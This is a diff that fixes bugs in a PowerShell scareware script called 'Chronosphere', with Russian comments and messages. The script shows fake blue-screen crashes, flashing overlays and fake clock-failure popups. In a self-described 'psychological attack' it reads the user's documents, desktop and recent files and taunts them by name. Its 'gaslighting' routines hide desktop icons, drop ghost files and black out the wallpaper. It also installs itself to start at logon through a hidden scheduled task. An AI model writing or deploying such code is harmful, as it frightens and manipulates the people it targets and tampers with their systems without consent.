@@ -84,123 +84,123 @@ function Test-VirtualEnvironment {
 #region Визуальные эффекты (Слой 1)
 function Start-VisualDistortion {
     # Запуск визуальных эффектов в отдельном процессе
-    $visualScript = @"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    `$script:forms = @()
-    `$script:timers = @()
+    $visualScript = @'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$script:forms = @()
+$script:timers = @()
+
+function Show-BSODEffect {
+    $form = New-Object Windows.Forms.Form
+    $form.Text = "SYSTEM FAILURE"
+    $form.WindowState = 'Maximized'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = 'Blue'
+    $form.TopMost = $true
+    $form.Opacity = 0.7
     
-    function Show-BSODEffect {
-        `$form = New-Object Windows.Forms.Form
-        `$form.Text = "SYSTEM FAILURE"
-        `$form.WindowState = 'Maximized'
-        `$form.FormBorderStyle = 'None'
-        `$form.BackColor = 'Blue'
-        `$form.TopMost = `$true
-        `$form.Opacity = 0.7
-        
-        `$label = New-Object Windows.Forms.Label
-        `$label.Text = "CRITICAL PROCESS DIED`n`nSTOP CODE: CHRONOSPHERE_MEMORY_CORRUPTION`n`nPLEASE WAIT"
-        `$label.ForeColor = 'White'
-        `$label.Font = New-Object Drawing.Font("Consolas", 20, [Drawing.FontStyle]::Bold)
-        `$label.TextAlign = 'MiddleCenter'
-        `$label.Dock = 'Fill'
-        
-        `$form.Controls.Add(`$label)
-        `$form.Show()
-        
-        `$timer = New-Object Windows.Forms.Timer
-        `$timer.Interval = 3000
-        `$timer.Add_Tick({
-            `$form.Close()
-            `$timer.Stop()
-        })
-        `$timer.Start()
-        
-        `$forms += `$form
-        `$timers += `$timer
-    }
+    $label = New-Object Windows.Forms.Label
+    $label.Text = "CRITICAL PROCESS DIED`n`nSTOP CODE: CHRONOSPHERE_MEMORY_CORRUPTION`n`nPLEASE WAIT"
+    $label.ForeColor = 'White'
+    $label.Font = New-Object Drawing.Font("Consolas", 20, [Drawing.FontStyle]::Bold)
+    $label.TextAlign = 'MiddleCenter'
+    $label.Dock = 'Fill'
     
-    function Start-PixelDistortion {
-        `$form = New-Object Windows.Forms.Form
-        `$form.Size = New-Object Drawing.Size(100, 100)
-        `$form.StartPosition = 'Manual'
-        `$form.FormBorderStyle = 'None'
-        `$form.BackColor = [Drawing.Color]::FromArgb(255, 0, 0)
-        `$form.TopMost = `$true
-        `$form.ShowInTaskbar = `$false
-        `$form.Opacity = 0.3
-        
-        `$timer = New-Object Windows.Forms.Timer
-        `$timer.Interval = 100
-        `$timer.Add_Tick({
-            `$form.Location = New-Object Drawing.Point(
-                (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width),
-                (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-            )
-            `$form.BackColor = [Drawing.Color]::FromArgb(
-                255,
-                (Get-Random -Minimum 0 -Maximum 256),
-                (Get-Random -Minimum 0 -Maximum 256),
-                (Get-Random -Minimum 0 -Maximum 256)
-            )
-        })
-        `$timer.Start()
-        
-        `$forms += `$form
-        `$timers += `$timer
-    }
+    $form.Controls.Add($label)
+    $form.Show()
     
-    function Invert-ScreenColors {
-        `$form = New-Object Windows.Forms.Form
-        `$form.WindowState = 'Maximized'
-        `$form.FormBorderStyle = 'None'
-        `$form.BackColor = [Drawing.Color]::Black
-        `$form.TransparencyKey = [Drawing.Color]::Black
-        `$form.TopMost = `$true
-        `$form.Opacity = 0.5
-        
-        `$graphics = `$form.CreateGraphics()
-        `$timer = New-Object Windows.Forms.Timer
-        `$timer.Interval = 500
-        
-        `$timer.Add_Tick({
-            `$form.BackColor = if (`$form.BackColor -eq [Drawing.Color]::Black) {
-                [Drawing.Color]::White
-            } else {
-                [Drawing.Color]::Black
-            }
-        })
-        `$timer.Start()
-        
-        `$forms += `$form
-        `$timers += `$timer
-    }
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 3000
+    $timer.Add_Tick({
+        $form.Close()
+        $timer.Stop()
+    })
+    $timer.Start()
     
-    # Запускаем эффекты
-    `$effects = @(
-        { Show-BSODEffect },
-        { Start-PixelDistortion },
-        { Invert-ScreenColors }
-    )
+    $script:forms += $form
+    $script:timers += $timer
+}
+
+function Start-PixelDistortion {
+    $form = New-Object Windows.Forms.Form
+    $form.Size = New-Object Drawing.Size(100, 100)
+    $form.StartPosition = 'Manual'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = [Drawing.Color]::FromArgb(255, 0, 0)
+    $form.TopMost = $true
+    $form.ShowInTaskbar = $false
+    $form.Opacity = 0.3
     
-    `$effectTimer = New-Object Windows.Forms.Timer
-    `$effectTimer.Interval = 10000  # Каждые 10 секунд новый эффект
-    `$effectCounter = 0
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 100
+    $timer.Add_Tick({
+        $form.Location = New-Object Drawing.Point(
+            (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width),
+            (Get-Random -Minimum 0 -Maximum [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        )
+        $form.BackColor = [Drawing.Color]::FromArgb(
+            255,
+            (Get-Random -Minimum 0 -Maximum 256),
+            (Get-Random -Minimum 0 -Maximum 256),
+            (Get-Random -Minimum 0 -Maximum 256)
+        )
+    })
+    $timer.Start()
     
-    `$effectTimer.Add_Tick({
-        if (`$effectCounter -lt `$effects.Count) {
-            & `$effects[`$effectCounter]
-            `$effectCounter++
+    $script:forms += $form
+    $script:timers += $timer
+}
+
+function Invert-ScreenColors {
+    $form = New-Object Windows.Forms.Form
+    $form.WindowState = 'Maximized'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = [Drawing.Color]::Black
+    $form.TransparencyKey = [Drawing.Color]::Black
+    $form.TopMost = $true
+    $form.Opacity = 0.5
+    
+    $graphics = $form.CreateGraphics()
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 500
+    
+    $timer.Add_Tick({
+        if ($form.BackColor -eq [Drawing.Color]::Black) {
+            $form.BackColor = [Drawing.Color]::White
         } else {
-            `$effectTimer.Stop()
+            $form.BackColor = [Drawing.Color]::Black
         }
     })
+    $timer.Start()
     
-    `$effectTimer.Start()
-    
-    [Windows.Forms.Application]::Run()
-"@
+    $script:forms += $form
+    $script:timers += $timer
+}
+
+# Запускаем эффекты
+$effects = @(
+    { Show-BSODEffect },
+    { Start-PixelDistortion },
+    { Invert-ScreenColors }
+)
+
+$effectTimer = New-Object Windows.Forms.Timer
+$effectTimer.Interval = 10000  # Каждые 10 секунд новый эффект
+$effectCounter = 0
+
+$effectTimer.Add_Tick({
+    if ($effectCounter -lt $effects.Count) {
+        & $effects[$effectCounter]
+        $effectCounter++
+    } else {
+        $effectTimer.Stop()
+    }
+})
+
+$effectTimer.Start()
+
+[Windows.Forms.Application]::Run()
+'@
     
     # Запускаем в отдельном процессе
     $ps = [PowerShell]::Create()
@@ -296,8 +296,8 @@ function Start-TemporalAnomalies {
 function Show-TimeJump {
     $jumpTypes = @(
         @{Text = "СИСТЕМНОЕ ВРЕМЯ: 88:88:88"; Color = "Red"},
-        @{Text = "ВРЕМЕННАЯ АНОМАЛИЯ: +$(Get-Random -Min 1 -Max 99) ЧАСОВ"; Color = "Yellow"},
-        @{Text = "ХРОНОМЕТРИЧЕСКИЙ СБОЙ: $(Get-Date -Format 'dd.MM.yyyy') -> $(Get-Date -Year ((Get-Date).Year + (Get-Random -Min -10 -Max 10)) -Format 'dd.MM.yyyy')"; Color = "Cyan"}
+        @{Text = "ВРЕМЕННАЯ АНОМАЛИЯ: +$(Get-Random -Minimum 1 -Maximum 99) ЧАСОВ"; Color = "Yellow"},
+        @{Text = "ХРОНОМЕТРИЧЕСКИЙ СБОЙ: $(Get-Date -Format 'dd.MM.yyyy') -> $(Get-Date -Year ((Get-Date).Year + (Get-Random -Minimum -10 -Maximum 10)) -Format 'dd.MM.yyyy')"; Color = "Cyan"}
     )
     
     $jump = $jumpTypes | Get-Random
@@ -331,6 +331,91 @@ function Show-TimeJump {
     $timer.Start()
 }
 
+function Show-ReverseTime {
+    $form = New-Object Windows.Forms.Form
+    $form.Size = New-Object Drawing.Size(400, 150)
+    $form.StartPosition = 'CenterScreen'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = 'DarkRed'
+    $form.TopMost = $true
+    $form.Opacity = 0.9
+    
+    $label = New-Object Windows.Forms.Label
+    $label.Text = "ВРЕМЯ ИДЕТ НАЗАД:`n$(Get-Date -Format 'HH:mm:ss')`n↓`n$((Get-Date).AddMinutes(-5) -Format 'HH:mm:ss')"
+    $label.ForeColor = 'White'
+    $label.Font = New-Object Drawing.Font("Consolas", 16, [Drawing.FontStyle]::Bold)
+    $label.Dock = 'Fill'
+    $label.TextAlign = 'MiddleCenter'
+    
+    $form.Controls.Add($label)
+    $form.Show()
+    
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 3000
+    $timer.Add_Tick({ 
+        $form.Close()
+        $timer.Stop()
+    })
+    $timer.Start()
+}
+
+function Show-FrozenTime {
+    $form = New-Object Windows.Forms.Form
+    $form.Size = New-Object Drawing.Size(350, 120)
+    $form.StartPosition = 'CenterScreen'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = 'DarkBlue'
+    $form.TopMost = $true
+    $form.Opacity = 0.9
+    
+    $label = New-Object Windows.Forms.Label
+    $label.Text = "ВРЕМЯ ЗАМЕРОЗКА`n⏰ $(Get-Date -Format 'HH:mm:ss')`n⏸ ЗАМОРОЖЕНО"
+    $label.ForeColor = 'Cyan'
+    $label.Font = New-Object Drawing.Font("Consolas", 14, [Drawing.FontStyle]::Bold)
+    $label.Dock = 'Fill'
+    $label.TextAlign = 'MiddleCenter'
+    
+    $form.Controls.Add($label)
+    $form.Show()
+    
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 4000
+    $timer.Add_Tick({ 
+        $form.Close()
+        $timer.Stop()
+    })
+    $timer.Start()
+}
+
+function Show-BrokenTime {
+    $form = New-Object Windows.Forms.Form
+    $form.Size = New-Object Drawing.Size(450, 180)
+    $form.StartPosition = 'CenterScreen'
+    $form.FormBorderStyle = 'None'
+    $form.BackColor = 'DarkGreen'
+    $form.TopMost = $true
+    $form.Opacity = 0.9
+    
+    $brokenTime = "$(Get-Random -Minimum 0 -Maximum 99):$(Get-Random -Minimum 0 -Maximum 99):$(Get-Random -Minimum 0 -Maximum 99)"
+    $label = New-Object Windows.Forms.Label
+    $label.Text = "ХРОНОМЕТРИЧЕСКИЙ СБОЙ`n📟 $brokenTime`n🔧 СИСТЕМНЫЕ ЧАСЫ НЕИСПРАВНЫ"
+    $label.ForeColor = 'Yellow'
+    $label.Font = New-Object Drawing.Font("Consolas", 15, [Drawing.FontStyle]::Bold)
+    $label.Dock = 'Fill'
+    $label.TextAlign = 'MiddleCenter'
+    
+    $form.Controls.Add($label)
+    $form.Show()
+    
+    $timer = New-Object Windows.Forms.Timer
+    $timer.Interval = 3500
+    $timer.Add_Tick({ 
+        $form.Close()
+        $timer.Stop()
+    })
+    $timer.Start()
+}
+
 function Create-TimeDesync {
     # Создаем временные файлы с разным временем
     $times = @(
@@ -340,13 +425,13 @@ function Create-TimeDesync {
         (Get-Date).AddMonths(-2)
     )
     
-    $tempFile = "$env:TEMP\Chronosphere\time_anomaly_$(Get-Random -Min 1000 -Max 9999).log"
+    $tempFile = "$env:TEMP\Chronosphere\time_anomaly_$(Get-Random -Minimum 1000 -Maximum 9999).log"
     
     $content = @()
     foreach ($t in $times) {
         $content += "LOG ENTRY: $($t.ToString('yyyy-MM-dd HH:mm:ss.fff')) - Temporal anomaly detected"
-        $content += "VECTOR: Chronosphere/TimeDesync/$(Get-Random -Min 1 -Max 9)"
-        $content += "SEVERITY: $(Get-Random -Min 1 -Max 10)/10"
+        $content += "VECTOR: Chronosphere/TimeDesync/$(Get-Random -Minimum 1 -Maximum 9)"
+        $content += "SEVERITY: $(Get-Random -Minimum 1 -Maximum 10)/10"
         $content += ""
     }
     
@@ -354,8 +439,9 @@ function Create-TimeDesync {
     
     # Меняем время создания файла
     $randomTime = $times | Get-Random
-    (Get-Item $tempFile).CreationTime = $randomTime
-    (Get-Item $tempFile).LastWriteTime = $randomTime.AddMinutes(Get-Random -Min 1 -Max 60)
+    $file = Get-Item $tempFile
+    $file.CreationTime = $randomTime
+    $file.LastWriteTime = $randomTime.AddMinutes((Get-Random -Minimum 1 -Maximum 60))
 }
 #endregion
 
@@ -369,7 +455,7 @@ function Start-PersonalPsychologicalAttack {
         DocumentsCount = (Get-ChildItem "$env:USERPROFILE\Documents" -File -ErrorAction SilentlyContinue).Count
         DesktopFiles = (Get-ChildItem "$env:USERPROFILE\Desktop" -File -ErrorAction SilentlyContinue).Name
         RecentFiles = Get-RecentFiles
-        SystemUptime = [math]::Round((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours
+        SystemUptime = [math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours, 1)
     }
     
     # Запускаем таймер для персонализированных сообщений
@@ -379,10 +465,11 @@ function Start-PersonalPsychologicalAttack {
     $timer.AutoReset = $true
     
     $messageIndex = 0
+    $messageTypes = @('файлы', 'документы', 'данные')
     $personalMessages = @(
-        "Привет, $Username. Мы изучаем твои $(@('файлы', 'документы', 'данные')[$(Get-Random -Max 3)])...",
+        "Привет, $Username. Мы изучаем твои $($messageTypes | Get-Random)...",
         "Обнаружено: $(if ($userData.DocumentsCount -gt 50) {'Много документов'} else {'Немного документов'}) в папке Documents",
-        "Время работы системы: $($userData.SystemUptime) часов. До сбоя: $(Get-Random -Min 1 -Max 99) минут",
+        "Время работы системы: $($userData.SystemUptime) часов. До сбоя: $(Get-Random -Minimum 1 -Maximum 99) минут",
         "$Username... твои недавние файлы: $((@($userData.RecentFiles) | Select-Object -First 3) -join ', ')",
         "Мы знаем о тебе больше, чем ты думаешь. $(Get-Date -Format 'HH:mm') - это не настоящее время"
     )
@@ -488,14 +575,14 @@ function Start-GaslightingEffects {
                 $originalAttributes = (Get-Item $icon.FullName).Attributes
                 (Get-Item $icon.FullName).Attributes = 'Hidden'
                 
-                Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
+                Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
                 
                 (Get-Item $icon.FullName).Attributes = $originalAttributes
             }
         },
         {
             # Создание "призрачных" файлов
-            $ghostFile = "$env:USERPROFILE\Desktop\DELETEME_$(Get-Random -Min 1000 -Max 9999).tmp"
+            $ghostFile = "$env:USERPROFILE\Desktop\DELETEME_$(Get-Random -Minimum 1000 -Maximum 9999).tmp"
             $content = @(
                 "Этот файл не должен здесь быть",
                 "Создан: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
@@ -520,47 +607,57 @@ public class Wallpaper {
     }
 }
 '@
-            Add-Type -TypeDefinition $code
-            [Wallpaper]::SetBlackWallpaper()
+            Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
+            try {
+                [Wallpaper]::SetBlackWallpaper()
+            } catch {}
             
             Start-Sleep -Seconds 30
             
-            # Восстанавливаем (упрощенно - через вызов системной функции)
-            rundll32.exe user32.dll, UpdatePerUserSystemParameters
+            # Восстанавливаем
+            try {
+                rundll32.exe user32.dll, UpdatePerUserSystemParameters
+            } catch {}
         }
     )
     
     $gaslightTimer.Add_Elapsed({
         if ($effectIndex -lt $effects.Count) {
-            & $effects[$effectIndex]
+            try {
+                & $effects[$effectIndex]
+            } catch {
+                # Игнорируем ошибки
+            }
             $effectIndex++
         } else {
             $gaslightTimer.Stop()
         }
     })
+    
+    return $gaslightTimer
 }
 #endregion
 
 #region Мониторинг активности и управление
 function Register-ActivityHooks {
     # Регистрируем отслеживание активности
-    $activityScript = @"
-    Add-Type -AssemblyName System.Windows.Forms
-    `$script:lastActivity = [DateTime]::Now
-    
-    `$mouseHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "MouseMove" -Action {
-        `$script:lastActivity = [DateTime]::Now
-    }
-    
-    `$keyboardHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "KeyDown" -Action {
-        `$script:lastActivity = [DateTime]::Now
-    }
-    
-    # Функция для получения времени последней активности
-    function Get-LastActivityTime {
-        return `$script:lastActivity
-    }
-"@
+    $activityScript = @'
+Add-Type -AssemblyName System.Windows.Forms
+$script:lastActivity = [DateTime]::Now
+
+$mouseHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "MouseMove" -Action {
+    $script:lastActivity = [DateTime]::Now
+}
+
+$keyboardHook = Register-ObjectEvent -InputObject ([System.Windows.Forms.Form]) -EventName "KeyDown" -Action {
+    $script:lastActivity = [DateTime]::Now
+}
+
+# Функция для получения времени последней активности
+function Get-LastActivityTime {
+    return $script:lastActivity
+}
+'@
     
     $activityPS = [PowerShell]::Create()
     $null = $activityPS.AddScript($activityScript)
@@ -594,7 +691,7 @@ function Start-MainLoop {
     
     Write-Host "[CHRONOSPHERE] Запуск в: $startTime" -ForegroundColor Green
     Write-Host "[CHRONOSPHERE] Пользователь: $username" -ForegroundColor Green
-    Write-Host "[CHRONOSPHERE] Максимальное время работы: $($Global:TimeConfig.TotalRuntime / 60) минут" -ForegroundColor Yellow
+    Write-Host "[CHRONOSPHERE] Максимальное время работы: $([math]::Round($Global:TimeConfig.TotalRuntime / 60)) минут" -ForegroundColor Yellow
     
     # Запускаем все слои
     $visualJob = Start-VisualDistortion
@@ -643,7 +740,6 @@ function Start-MainLoop {
         if ($elapsedTime -ge $Global:TimeConfig.EscalationTime -and $phase -eq 1) {
             Write-Host "[CHRONOSPHERE] Эскалация эффектов..." -ForegroundColor Red
             $phase = 2
-            # Можно добавить дополнительные эффекты здесь
         }
         
         # Вывод информации о состоянии (в логи)
@@ -654,7 +750,7 @@ function Start-MainLoop {
          Бездействие: $([math]::Round($inactivityTime / 60, 1)) мин
          Фаза: $phase
 "@
-            Add-Content -Path "$env:TEMP\Chronosphere\Logs\status.log" -Value $logEntry
+            Add-Content -Path "$env:TEMP\Chronosphere\Logs\status.log" -Value $logEntry -ErrorAction SilentlyContinue
         }
     })
     
@@ -722,12 +818,16 @@ function Stop-Chronosphere {
 
 function Restore-SystemSettings {
     # Восстанавливаем обои
-    rundll32.exe user32.dll, UpdatePerUserSystemParameters
+    try {
+        rundll32.exe user32.dll, UpdatePerUserSystemParameters 2>$null
+    } catch {}
     
     # Восстанавливаем скрытые файлы
     $desktopPath = [Environment]::GetFolderPath('Desktop')
     Get-ChildItem $desktopPath -Hidden -ErrorAction SilentlyContinue | ForEach-Object {
-        $_.Attributes = 'Normal'
+        try {
+            $_.Attributes = 'Normal'
+        } catch {}
     }
 }
 
@@ -770,8 +870,10 @@ function Cleanup-TemporaryFiles {
     }
     
     # Освобождаем мьютекс
-    $mutex.ReleaseMutex()
-    $mutex.Dispose()
+    try {
+        $mutex.ReleaseMutex()
+        $mutex.Dispose()
+    } catch {}
 }
 #endregion
 
@@ -798,12 +900,16 @@ function Install-AutoStart {
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
     $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
     
-    Register-ScheduledTask -TaskName "ChronosphereSystemTest" `
-                           -Action $action `
-                           -Trigger $trigger `
-                           -Principal $principal `
-                           -Settings $settings `
-                           -Force | Out-Null
+    try {
+        Register-ScheduledTask -TaskName "ChronosphereSystemTest" `
+                               -Action $action `
+                               -Trigger $trigger `
+                               -Principal $principal `
+                               -Settings $settings `
+                               -Force | Out-Null
+    } catch {
+        Write-Host "[CHRONOSPHERE] Ошибка создания задачи в планировщике: $_" -ForegroundColor Yellow
+    }
 }
 
 function Uninstall-AutoStart {
@@ -812,7 +918,9 @@ function Uninstall-AutoStart {
     Remove-ItemProperty -Path $regPath -Name "ChronosphereTest" -ErrorAction SilentlyContinue
     
     # Удаляем задание из планировщика
-    Unregister-ScheduledTask -TaskName "ChronosphereSystemTest" -Confirm:$false -ErrorAction SilentlyContinue
+    try {
+        Unregister-ScheduledTask -TaskName "ChronosphereSystemTest" -Confirm:$false -ErrorAction SilentlyContinue
+    } catch {}
     
     Write-Host "[CHRONOSPHERE] Автозапуск удален" -ForegroundColor Green
 }
